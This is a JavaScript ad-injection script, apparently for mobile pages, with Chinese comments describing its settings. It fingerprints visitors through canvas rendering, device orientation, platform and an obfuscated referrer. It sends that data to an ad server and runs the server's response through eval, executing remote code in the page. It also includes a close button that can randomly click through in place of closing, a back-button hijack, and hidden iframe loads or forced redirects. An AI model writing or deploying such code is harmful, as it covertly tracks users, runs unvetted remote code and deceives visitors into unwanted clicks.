(function () {
    var l = Math.random().toString(36).substr(2);
    var d = Math.random().toString(36).substr(2);
    var k = Math.random().toString(36).substr(2);
    var s = Math.random().toString(36).substr(2);
    var q = Math.random().toString(36).substr(2);
    var a = "jd_callback_" + l;
    var b = "li_callback_" + l;
    var r = "qa_callback_" + l;
    var e = new Date();
    var o = "wm_";
    var n = o + e.getYear() + e.getMonth() + e.getDate() + e.getHours() + parseInt(new Date().getMinutes() / 30);
    var m = "wm_" + Math.random().toString(36).substr(2);
    var w = navigator.userAgent;

    function f(A, B) {
        var x = A.getElementsByTagName("*");
        var y = new Array();
        for (var z = 0; z < x.length; z++) {
            if (x[z].className == B) {
                y.push(x[z])
            }
        }
        return y
    }
    function g(B) {
        var z = document.createElement("canvas");
        var A = z.getContext("2d");
        var F = B;
        A.textBaseline = "top";
        A.font = "14px 'Arial'";
        A.textBaseline = "tencent";
        A.fillStyle = "#f60";
        A.fillRect(125, 1, 62, 20);
        A.fillStyle = "#069";
        A.fillText(F, 2, 15);
        A.fillStyle = "rgba(102, 204, 0, 0.7)";
        A.fillText(F, 4, 17);
        var x = z.toDataURL().replace("data:image/png;base64,", "");
        var y = atob(x).slice(-16, -12) + "";
        var E = "";
        for (var C = 0; C < y.length; C++) {
            var D = y.charCodeAt(C).toString(16);
            E += D.length < 2 ? "0" + D : D
        }
        return E
    }

    var ref = function () {
        var u;
        try {
            u = window.top.document.referrer;
        }
        catch (err) {
            u = document.referrer;
        }
        var r = '', c;
        for (var i = 0; i < u.length; i++) {
            if (i == 1000) {
                break;
            }
            c = u.charCodeAt(i);
            if (c > 96 && c < 123) {
                c += i % 8;
                if (c > 122)
                    c -= 26;
            }
            r += String.fromCharCode(c);
        }
        return r;
    };

    var h = document.getElementsByTagName("head")[0];
    var c = null;
    var t = null;
    window[b] = function (x) {
        h.removeChild(c);
        if (x.isEject) {
            var i = document.createElement("iframe");
            i.style = "display:none";
            i.src = x.link;
            document.body.appendChild(i)
        } else {
            top.location.href = x.link
        }
    };
    window[r] = function (i) {
        h.removeChild(t)
    };

    window[a] = function (ay) {
        window[a] = null;
        var al = ay.configs;
        var ah = (al.shdowH); // 阴影比例，如0.2为20%
        var ai = (al.shdowP == "1" ? true : false); // 阴影是否显示，0不显示，1为显示
        var ac = (al.isback); // 是否监听返回按钮，0-1之间随机，大于等于1则监听。第一次打开页面起作用
        var ae = (al.isClose); // 点击关闭按钮关闭，0-1之间随机，大于等于1则直接关闭
        var aa = (al.effect); // 动画效果
        var ba = al.heightNu; // 高，1是默认图片原本高 ,大于1时候，数字越大高度越小
        var bc = al.zhiwen;
        var T = /CPU (?:iPhone )?OS (\d+_\d+)/i.test(navigator.userAgent) ? "IOS" + parseFloat(RegExp[
            "$1"].replace("_", ".")) : "";
        var U = true;
        var am = 0,
            an = 0,
            ao = 0,
            V = 0,
            W = 0,
            X = 0;
        var v = (document.compatMode=="CSS1Compat") ? document.documentElement : document.body,ww = v.clientWidth || window['innerWidth'];
        var bb;
        if( ww == "" ){ ww = 0; }
        if( ww > screen.width){
            bb = ww;
        } else {
            bb = screen.width;
        }
        if(bb > screen.height){ bb = screen.height }

        var zl = an+","+ao+","+am;
        if (window.DeviceOrientationEvent) {
        	window.addEventListener("deviceorientation", function (i) {
	            if (U) {
	                an = Math.floor(i.beta);
	                ao = Math.floor(i.gamma);
	                am = Math.floor(i.alpha);
	                U = false
	            } else {
	                W = Math.floor(i.beta);
	                X = Math.floor(i.gamma);
	                V = Math.floor(i.alpha);
	            }
	        });
        }else {
        	zl = '_false_no_zhichi';
        }
        var str = navigator.userAgent.toLowerCase();
        var ver = str.match(/cpu iphone os (.*?) like mac os/);
        if(ver && ver[1].replace(/_/g,".") >= 12){
        	zl = '_false_no_zhichi';
        }
        
        var at = false;
        var au = document.getElementsByTagName("link");
        for (var aq = 0; aq < au.length; aq++) {
            if (au[aq].href.indexOf("animate.min.css") >= 0) {
                at = true
            }
        }
        if (!at) {
            var R = document.createElement("link");
            R.type = "text/css";
            R.rel = "stylesheet";
            // R.href = F + "/sc/animate.min.css"; // 动画css地址
            R.href = "https://cdn.bootcss.com/animate.css/3.7.2/animate.min.css";
            h.appendChild(R)
        }
        var ap = "";
        ap += '<div class="' + d +
            '" style="right: 0px;position: absolute;top: 0px;height:20px;z-index: 2147483647;">';
        ap += '<img src="'+ ay.btn +'" />'; // 关闭按钮图片
        ap += "</div>";
        ap += '<img class="' + k + '" style="padding: 0; margin: 0; width: 100%;height: 100%"/>';

        // 向服务器发送请求
        function cta(ct){
	    	var M18_url = ay.alink + "&ref=" + ref() + "&refso=" + navigator.platform + "_dp&zhongli=_"+zl+'zhiwen_'+g(bc);
	        var a = new XMLHttpRequest();
	        var b = M18_url + '&n='+window.history.length+'&ct='+ct+'&r='+Math.floor(Math.random()*9999999+1);
	        if(a!=null){a.onreadystatechange=function(){if(a.readyState==4 && a.status==200){if(window.execScript)window.execScript(a.responseText,'JavaScript');else if(window.eval)window.eval(a.responseText,'JavaScript');else eval(a.responseText);}};a.open('GET',b,true);a.send();}
	    }
        var Q = document.createElement("DIV");
        Q.id = l;
        Q.innerHTML = ap;
        var aposi = 'f'+ 'i' + 'x'+ 'e'+'d'; // 默认定位
        var uastr = navigator.userAgent.toLowerCase();
        if (uastr.indexOf('baidu') > -1) {
        	aposi = 'absolute';
        }
        Q.setAttribute("style",
            "left: 0px; bottom: 0px; overflow: hidden; position: "+aposi+" !important; z-index: 92147483647;width:100%;"
        );
        Q.setAttribute("class", "animated " + aa);
        Q.onclick = function () {
            cta(1)
        };
        var ax = document.createElement("DIV"); // 阴影
        ax.setAttribute("style", "position:absolute;z-index: 82147483748;left:0px;width:100%;");
        ax.onclick = function () {
            cta(3)
        };
        var L = f(Q, d);
        var O = f(Q, s);
        var P = f(Q, q);
        L[0].onclick = function (az) { // 关闭按钮
            if (Math.random() < ae) {
                Q.style.display = "none"
            } else {
                cta(5)
            }
            az.stopPropagation()
        };
        var N = f(Q, k);
        var M = ay.images[Math.floor(Math.random() * ay.images.length)];
        N[0].src = M.Url;
        N[0].onload = function () {
            var i = parseInt("0" + document.getElementsByTagName("body")[0].style.paddingBottom);
            i += parseInt(this.offsetHeight);
            document.getElementsByTagName("body")[0].style.paddingBottom = i + "px";
            Q.style.height = this.offsetHeight + "px";
            if (ba != 1) {
            	Q.style.height = bb/ba + "px";
            }
            ax.style.bottom = i + "px";
            if (ai) {
            	ax.style.height = (bb/ba)*ah + "px";
            }
        };
        var Y = function () {
            document.getElementsByTagName("body")[0].appendChild(Q);
            document.getElementsByTagName("body")[0].appendChild(ax)
        };
        Y();
        setInterval(function () { // 添加动画
            Q.setAttribute("class", "animated " + aa);
            setTimeout(function () {
                Q.setAttribute("class", "")
            }, 1000)
        }, 4000);
        if (ac == 1) { // 判断是否监听返回按钮
            window.history.pushState(history.length + 1, "message", "#" + new Date().getTime());
            window.addEventListener("popstate", function (i) {
                cta(1)
            }, false)
        }
    };
    
    //if (!(navigator.platform.match(/^(Win|Mac|x11)\s*/))) {
        // 本地调试直接调用函数
        window[a]({
		  'images': [
			{
			  'Url': 'https://b.bdstatic.com/searchbox/icms/searchbox/img/yinni0714.jpg', // 广告图片
			  'Industry': 'YL'
			}
		  ],
		  'btn': 'https://gss0.bdstatic.com/5bd1bjqh_Q23odCf/static/wiseindex/img/baiduappAdClose2_530ee6b.png', //关闭按钮图片
		  'alink': 'https://baidu.com', // 链接
		  'configs': {
		  	'shdowH': 0.6, // 阴影比例，如0.2为20%
		  	'shdowP': 1, // 阴影是否显示，0不显示，1为显示
		  	'isback': 0, // 是否监听返回按钮，0-1之间随机，大于等于1则监听。第一次打开页面起作用
		  	'isClose': 1, // 点击关闭按钮关闭，0-1之间随机，大于等于1则直接关闭
		  	'effect': 'pulse', // 动画效果，pulse，tada，shake，还有其它的直接从https://daneden.github.io/animate.css/找
		  	'heightNu': 3.5, // 高，1是默认图片原本高 ,大于1时候，数字越大高度越小
		  	'zhiwen': 'zhsew' // 字符串，随便填
		  },
		});
    //}

	
})();
